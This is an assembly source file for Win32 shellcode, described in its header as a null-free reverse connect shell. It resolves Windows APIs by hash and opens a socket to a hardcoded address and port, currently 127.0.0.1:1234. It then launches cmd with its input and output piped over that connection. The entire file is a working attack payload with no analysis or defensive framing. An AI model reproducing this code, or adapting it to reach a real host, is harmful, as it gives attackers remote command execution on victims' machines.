
        ; saludos a todos en España
        ;
        ; win32 reverse connect shell, no null bytes
        ;
        ; nasm -fbin dx.asm
        ;
        ; assume: eax = offset @entry_point
        ;

                [bits 32]

                
entry_point:
                ;int3

		;cdq
		;mov	esp, eax
		;xor	eax, eax
		;mov	dl, (get_proc_address - entry_point)
		;lea	ebp, [esp + edx]

		;mov     dl, (code_end - get_proc_address)
    ;mov	    esi, ebp
    ;add     esi, edx

    ;mov     dl, (cmd_string - get_proc_address) + 3
    ;mov     edi, ebp
    ;add     edi, edx
		;stosb

    xor	ecx, ecx
		mov	cl, 74h
		sub	esp, ecx
		mov	edi, esp
		rep stosb

    push	byte 1
		push	byte 2
		call	ebp
		xchg	eax, ebx
		
    push  00100007Fh
    push  0D2040002h
    
    ;mov     eax, ~ 00100007Fh              ; ip address set to NOT(localhost)
    ;not     eax
    ;push    eax

		;mov     eax, ~ 0D2040002h & 0xFFFFFFFF              ; port set to NOT(1234)
		;not     eax
		;push    eax
    mov	eax, esp

    push	byte 10h
		push	eax
		push	ebx
		call	ebp

    add	esp, byte 10h

    push	ebx
		xchg	eax, ebx
		lea	ebx, [edi-54h]
		lea	edi, [ebx+38h]
    inc	dword [ebx+2Dh]
		cdq
		stosd
		stosd
		stosd
		push	edi
		push	ebx
		push	edx
		push	edx
		push	edx
		push	eax
		push	edx
		push	edx
		push	esi
		lodsd
		push	edx
		call	ebp

    push	-1
		push	dword [edi]

exit_code:
		call	ebp
		jmp	short exit_code

get_proc_address:
		lodsd
		pusha
		push	byte 30h
		pop	ecx
		mov	eax, [fs:ecx]
		mov	eax, [eax+0Ch]
		mov	esi, [eax+1Ch]
                ;int3
load_dll:
		lodsd
		xchg	eax, ebx
		lodsd
		lodsd
		xchg	eax, ebx
		push	eax

		mov	eax, [ebx+3Ch]
		mov	eax, [eax+ebx+78h]
		lea	esi, [eax+ebx+18h]
		lodsd
		xchg	eax, ecx
		lodsd
		add	eax, ebx
		push	eax
		lodsd
		lea	edi, [ebx+eax]
		lodsd
		lea	ebp, [ebx+eax]

load_api:
		mov	esi, [edi+ecx*4-4]
		add	esi, ebx
		xor	eax, eax
		cdq
hash_api:
		lodsb
		add	edx, eax
		ror	edx, 13
		dec	eax
		jns	hash_api
    cmp	edx, [esp+24h]
    loopnz	load_api
		pop	eax
		pop	esi
		jnz	load_dll
call_api:
		pop	eax
		movzx	edx, word [ebp+ecx*2-2]
		add	ebx, [eax+edx*4]
		pop	esi
		mov	[esp+1Ch], ebx
		popa
		jmp	eax
code_end:
		dd 087C1A5B2h ; WSASocketA
		dd 0E49C80ECh ; connect
cmd_string:
		;db 'cmd',0FFh
		dd 01772DFFEh ; CreateProcessA
		dd 05338DA4Bh ; WaitForSingleObject
		dd 0A2CDED6Eh ; CloseHandle
		dd 0DB93EB6Fh ; ExitThread

